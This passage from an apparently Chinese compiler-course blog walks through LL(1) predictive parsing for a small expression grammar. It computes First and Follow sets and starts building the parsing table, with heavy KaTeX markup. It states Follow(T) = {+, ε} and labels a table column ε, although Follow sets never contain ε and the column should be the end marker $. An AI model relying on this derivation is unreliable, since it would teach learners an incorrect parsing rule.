reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>。就到了第九步。</p><p>第九步，栈顶符号+和输入符号+完全一致，弹栈。输入指针指向下一个。</p><p>类似的操作，到了第十三步，栈顶符号位E’，输入符号为串终结符号。很显然这时候我们需要将E’ 推导为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>，相当于直接把E’弹栈了。</p><p>所以让我们续写这个图的话，第十三步应该是把E’推导为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>。即弹栈。</p><p>然后第十四步，栈顶符号为$。输入符号$。两者同时达到终结符号。说明分析成功。</p><p>然后我们考虑一下程序如何知道如何推导，因为在之前的过程中我们是通过人眼看出接下来应该怎么推导的。这个时候需要用到预测分析表了，表的行对应栈顶符号，表的列对应当前输入字符。表中的项代表在行对应的栈顶符号和列定影的输入字符情况下应该干的事，是可以进行推导，还是报错。</p><p><img src="https://upyun.wuuconix.link/image-20211111204709243.png" alt="预测分析表" /></p><p>我们看到，表中的E在遇到id的时候会进行推导为TE’，这正是我们在之前第一步到第三步干的事情。</p><p>再看E’遇到$的时候 进行空串推导，这正是我们最后第十二步到第十四步干的事情。</p><p>所以程序实现时，分析栈顶符号和输入符号的时候就需要来查这个预测分析表。</p><p>那比如我们在栈顶符号为E而输入符号为+，那要怎么办呢？我们仔细观察产生式就能知道，E直接遇到了+应该是不正常的，因为E只有一个产生式E-&gt;TE’，而T也只有一个产生式T-&gt;id。所以E应该会先遇到一个id，而不是一个+。这个时候我们就需要进行报错。</p><p>以下为LL（1）分析的详细过程</p><p><img src="https://upyun.wuuconix.link/image-20211111205353246.png" alt="原理" /></p><h3 id="ll1分析器-预测分析表的构造算法"><a class="markdownIt-Anchor" href="#ll1分析器-预测分析表的构造算法"></a> LL（1）分析器 预测分析表的构造算法</h3><p><img src="https://upyun.wuuconix.link/image-20211111211343172.png" alt="构造算法" /></p><p>我们可以看到构造算法中会用到first集和follow集。我们先把上面例子的每个语法变量的first集和follow集算出来吧!</p><p>文法:</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow T E&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27; | \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mo>→</mo><mi>i</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">T\rightarrow id</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span></span></span></span></p><p>先求Firsr集。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>r</mi><mi>t</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Firsrt(E)=\{id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo>+</mo><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(E&#x27;)=\{+,\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">+</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(T)=\{id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span></p><p>再求Follow集，follow集从开始符号算起。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi mathvariant="normal">$</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Follow(E)=\{\$ \}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">$</span><span class="mclose">}</span></span></span></span></p><blockquote><p>开始符号的follow集中有字符串结束符号</p></blockquote><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>E</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi mathvariant="normal">$</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Follow(E&#x27;)=Follow(E)=\{\$\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">$</span><span class="mclose">}</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>o</mi><mi>l</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo>+</mo><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Follow(T)=First(E&#x27;)=\{+,\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">+</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">}</span></span></span></span></p><p>求完了，我们现在来按照上面的定义来生成预测分析表。</p><p>对于第一个产生式，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mi>i</mi><mi>d</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(TE&#x27;)=First(T)=\{id\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mclose">}</span></span></span></span>。</p><p>填表。</p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">id</th></tr></thead><tbody><tr><td style="text-align:center">E</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow T E&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td></tr></tbody></table><p>对于第二个产生式，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>F</mi><mi>i</mi><mi>r</mi><mi>s</mi><mi>t</mi><mo stretchy="false">(</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo>+</mo><mo separator="true">,</mo><mi>ϵ</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">First(+TE&#x27;|\epsilon)=\{+,\epsilon\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">+</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">ϵ</span><span class="mclose">}</span></span></span></span></p><table><thead><tr><th></th><th>id</th><th>+</th><th><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></th></tr></thead><tbody><tr><td>E</td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo>→</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E\rightarrow T E&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td></td><td></td></tr><tr><td>E’</td><td></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></td><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span></td></tr></tbody></table><blockquote><p>这里要注意，我们需要手动将产生式的的候选式分开。不然到时候栈不知道具体怎么推导。</p><p>实际上 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27; |\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">ϵ</span></span></span></span> 是两个产生式</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mo>+</mo><mi>T</mi><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow +TE&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord">+</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>E</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">E&#x27;\rightarrow \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>。只不过我们为了形式简单进行了合并。到时候具体程序实现的时候可能还是要分开。就像这里手动填表的时候，需要分开。</p></blockquote><p>然后<span 